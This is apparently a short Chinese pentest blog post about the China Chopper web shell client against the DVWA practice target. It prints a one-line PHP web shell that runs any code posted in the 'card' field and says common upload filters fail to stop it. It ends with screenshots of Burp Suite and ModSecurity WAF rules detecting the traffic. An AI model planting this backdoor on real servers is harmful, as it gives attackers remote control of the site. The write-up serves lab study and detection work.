---
layout: post
title: "针对猜到的部分使用"
categories: pentest
tags: pentest caidao
author: zhangxx
---

{:toc}



## 菜刀利用
上传一句话木马 a.php 文件， 事实上非法上传有限制文件后缀，请求内容类型都不能防止非法上传。禁止00阻断文件进行上传也不行。后面描述高级WAF的防护。

```php
<?php @eval($_POST['card']);?>
```
- 其他的asp， jsp 也有 但是不加赘述了。

## 菜刀获取后的显示
![](https://raw.githubusercontent.com/the-champions-of-capua/staticfiles/master/caidao.png)

## burpsuit 监控菜刀的请求
![](https://raw.githubusercontent.com/the-champions-of-capua/staticfiles/master/caidao_monitor.png)

## 靶场DVWA的后台请求;单一的; 实际上部署了WAF可以进行过滤。
![](https://raw.githubusercontent.com/the-champions-of-capua/staticfiles/master/caidao_access.png)

## WAF / modsecurity引擎核心规则边界匹配过滤
![](https://raw.githubusercontent.com/the-champions-of-capua/staticfiles/master/waf_dettect.png)